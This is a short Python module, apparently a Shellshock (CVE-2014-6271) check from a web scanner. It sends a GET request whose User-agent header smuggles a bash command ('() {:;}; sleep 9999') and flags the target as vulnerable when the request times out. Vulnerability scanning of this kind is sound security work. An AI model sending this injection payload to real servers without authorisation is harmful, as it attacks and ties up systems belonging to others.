from core.libs import alert_bug
from core.libs import Colors as c
from logging import getLogger

log = getLogger('scant3r')


def main(url:str , http):
        log.info('send the payload with 125 timeout value')
        payload = "User-agent: () {:;}; sleep 9999"
        request = http.send('GET',url,timeout=125,headers={'User-agent':"() {:;}; sleep 9999"},IgnoreErrors=True)
        if type(request) == list:
            if 'Read timed out. (read timeout' in str(request[1]):
                log.info(
                        f'\n{c.good} {c.red} Shell Shock CVE-2014-6271 {c.rest}\nTarget: {url}\nHeader_payload="{payload}"\ntimeout=120\n')

